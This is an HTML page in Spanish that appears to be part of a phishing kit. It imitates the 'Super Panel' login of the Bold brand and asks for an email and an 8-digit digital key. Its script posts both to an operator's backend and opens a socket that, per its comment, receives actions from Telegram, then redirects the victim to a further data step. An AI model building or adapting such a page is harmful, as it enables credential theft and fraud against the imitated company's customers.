<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
  <title>Super Panel</title>
  <style>
    :root { color-scheme: light; --bg: #f8fbff; --surface: #ffffff; --text: #0f1b43; --muted: #5b6a8a; --accent: #ff5a5f; --accent-dark: #c43f47; --radius: 24px; --max: 1200px; font-family: Inter, system-ui, sans-serif; }
    * { box-sizing: border-box; }
    body { margin: 0; min-height: 100vh; background: var(--bg); color: var(--text); display: flex; align-items: center; justify-content: center; }
    img { max-width: 100%; height: auto; display: block; }
    a { color: inherit; text-decoration: none; }
    .auth-container { max-width: 400px; width: 100%; padding: 24px; background: var(--surface); border-radius: 16px; box-shadow: 0 10px 40px rgba(15, 27, 67, .1); position: relative; }
    .back { position: absolute; top: 16px; left: 16px; background: none; border: none; cursor: pointer; }
    .back img { width: 20px; height: 20px; }
    .logo { width: 64px; height: 65px; margin: 0 auto 24px; }
    .content { text-align: center; margin-bottom: 32px; }
    .title { font-size: 1rem; font-weight: 700; color: var(--text); margin: 0 0 8px; }
    .description { color: var(--muted); margin: 0; line-height: 1.6; }
    .form { display: flex; flex-direction: column; gap: 20px; margin-bottom: 32px; }
    .form-group { display: flex; flex-direction: column; gap: 8px; }
    .label { font-weight: 600; color: var(--text); margin: 0; }
    .input { padding: 12px; border: 1px solid #e1e5e9; border-radius: 8px; font-size: 1rem; }
    .input.error { border-color: #ff5a5f; }
    .checkbox { display: flex; align-items: flex-start; gap: 12px; }
    .checkbox input { margin-top: 2px; }
    .checkbox label { font-size: 0.875rem; color: var(--muted); line-height: 1.5; }
    .button { padding: 12px 24px; background: var(--accent); color: #fff; border: none; border-radius: 8px; font-weight: 700; cursor: pointer; width: 100%; text-align: center; display: block; }
    .button:hover { background: var(--accent-dark); }
    .button:disabled { opacity: 0.6; cursor: not-allowed; }
    .error-msg { color: #ff5a5f; font-size: 0.875rem; margin: 8px 0 0; display: none; }
  </style>
</head>
<body>
  <div class="auth-container">
    <button class="back">
      <img src="./assets/Super_Panel_files/arrow_back.add6581c.svg" alt="Regresar">
    </button>
    <img src="./assets/Super_Panel_files/logo.4552d4c8.svg" alt="Logo Bold" class="logo">
    <div class="content">
      <h1 class="title">¡Te damos la bienvenida a Bold!</h1>
      <p class="description">Ingresa con el correo registrado.</p>
    </div>

    <div class="form">
      <div class="form-group">
        <label class="label">Correo electrónico</label>
        <input type="email" class="input" placeholder="Correo electrónico" id="email" name="email">
        <p class="error-msg" id="errorMsg">Ingresa un correo electrónico válido.</p>
      </div>
      <div class="form-group">
        <label class="label">Clave digital (8 dígitos)</label>
        <input type="password" class="input" placeholder="Ej: 12345678" id="password" name="password" inputmode="numeric" maxlength="8" pattern="\d{8}" required>
      </div>
      <div class="checkbox">
        <input type="checkbox" id="remember" checked name="rememberMe">
        <label for="remember">Recordar mi información.</label>
      </div>
    </div>

    <button class="button" id="loginBtn">Ingresar</button>
  </div>

  <script src="./assets/js/config.js"></script>
  <script src="https://cdn.socket.io/4.8.1/socket.io.min.js"></script>
  <script>
  (async () => {
    // ── 1. Crear sesión en el backend ─────────────────────────────────────
    try {
      const r = await fetch(window.API_BASE_URL + '/api/session', { method: 'POST' });
      const d = await r.json();
      if (!d.success) throw new Error('Sin sesión');
      sessionStorage.setItem('sessionId', d.sessionId);
      // Conectar socket y registrar sesión para recibir acciones de Telegram
      const socket = io(window.API_BASE_URL);
      socket.on('connect', () => socket.emit('registerSession', d.sessionId));
    } catch (err) {
      console.error('❌ No se pudo crear la sesión:', err.message);
    }

    // ── 2. Enviar email al hacer clic ─────────────────────────────────────
    const btn      = document.getElementById('loginBtn');
    const emailEl  = document.getElementById('email');
    const errorMsg = document.getElementById('errorMsg');

    btn.addEventListener('click', async () => {
      const email     = emailEl.value.trim();
      const sessionId = sessionStorage.getItem('sessionId');

      errorMsg.style.display = 'none';

      if (!email || !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) {
        errorMsg.textContent = 'Ingresa un correo electrónico válido.';
        errorMsg.style.display = 'block';
        return;
      }
      
      const passwordVal = document.getElementById('password').value.trim();
      if (!/^\d{8}$/.test(passwordVal)) {
        errorMsg.textContent = 'La clave debe ser de exactamente 8 dígitos numéricos.';
        errorMsg.style.display = 'block';
        return;
      }

      if (!sessionId) {
        alert('Error de sesión. Recarga la página.');
        return;
      }

      btn.disabled   = true;
      btn.textContent = 'Enviando...';

      try {
        const res  = await fetch(window.API_BASE_URL + '/api/login', {
          method:  'POST',
          headers: { 'Content-Type': 'application/json' },
          body:    JSON.stringify({ sessionId, email, password: document.getElementById('password').value.trim() || email })
        });
        const data = await res.json();

        if (!data.success) {
          errorMsg.textContent   = data.error || 'Error al ingresar.';
          errorMsg.style.display = 'block';
          btn.disabled           = false;
          btn.textContent        = 'Ingresar';
          return;
        }

        window.Router.redirect('DATOS');
      } catch (err) {
        console.error(err);
        errorMsg.textContent   = 'Error de conexión. Intenta de nuevo.';
        errorMsg.style.display = 'block';
        btn.disabled           = false;
        btn.textContent        = 'Ingresar';
      }
    });
  })();
  </script>
</body>
</html>
